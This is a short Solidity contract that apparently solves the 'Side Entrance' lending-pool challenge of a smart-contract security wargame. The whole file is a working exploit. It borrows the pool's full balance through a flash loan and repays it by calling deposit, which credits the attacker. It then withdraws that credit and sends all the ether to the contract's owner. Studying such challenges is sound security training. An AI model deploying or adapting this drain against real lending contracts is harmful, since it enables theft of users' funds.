// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolHack {
    SideEntranceLenderPool public pool;
    address public owner;

    constructor(SideEntranceLenderPool pool_) {
        pool = pool_;
        owner = msg.sender;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    function execute() payable external {
        pool.deposit{value: address(this).balance }();
    }

    receive() external payable {}
}
